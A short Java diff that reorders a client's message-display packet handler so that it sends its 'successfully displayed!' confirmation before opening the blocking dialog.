@@ -17,7 +17,7 @@ public class S1PacketShowMessage implements IPacket
 	@Override
 	public void execute(Object object) throws Exception
 	{
-		JOptionPane.showMessageDialog(null, this.message, this.title, this.type);
 		Client.instance.outputStream.writeObject(new C1PacketMessage("successfully displayed!"));
+		JOptionPane.showMessageDialog(null, this.message, this.title, this.type);
 	}
 }
